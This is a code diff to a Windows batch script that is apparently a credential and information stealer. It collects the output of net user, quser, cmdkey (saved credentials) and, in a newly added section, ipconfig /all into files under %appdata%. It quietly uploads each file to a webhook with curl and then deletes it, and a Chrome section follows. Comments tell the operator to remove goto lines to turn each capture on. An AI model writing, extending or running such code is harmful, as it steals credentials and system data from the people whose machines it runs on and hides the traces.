@@ -61,6 +61,7 @@ goto skipnetuser
 	curl --silent --output /dev/null -F tasks=@"%netuser%" %webhook%
 	del "%netuser%" >nul 2>&1
 :skipnetuser
+
 :: QUSER - REMOVE THE GOTO IF YOU WANT IT TO BE CAPTURED
 :: ------------------------------------------------------------------
 goto skipquser
@@ -69,6 +70,7 @@ goto skipquser
 	curl --silent --output /dev/null -F tasks=@"%quser%" %webhook%
 	del "%quser%" >nul 2>&1
 :skipquser
+
 :: CMDKEY - REMOVE THE GOTO IF YOU WANT IT TO BE CAPTURED
 :: ------------------------------------------------------------------
 goto skipcmdkey
@@ -77,6 +79,15 @@ goto skipcmdkey
 	curl --silent --output /dev/null -F tasks=@"%cmdkey%" %webhook%
 	del "%cmdkey%" >nul 2>&1
 :skipcmdkey
+
+:: IPCONFIG /ALL - REMOVE THE GOTO IF YOU WANT IT TO BE CAPTURED
+:: ------------------------------------------------------------------
+goto skipipconfig
+	set "ipconfig=%appdata%\ipconfig.txt"
+	2>NUL ipconfig /all > "%ipconfig%"
+	curl --silent --output /dev/null -F tasks=@"%ipconfig%" %webhook%
+	del "%ipconfig%" >nul 2>&1
+:skipipconfig
 
 :: CHROME - REMOVE THE GOTO IF YOU WANT IT TO BE CAPTURED
 :: ------------------------------------------------------
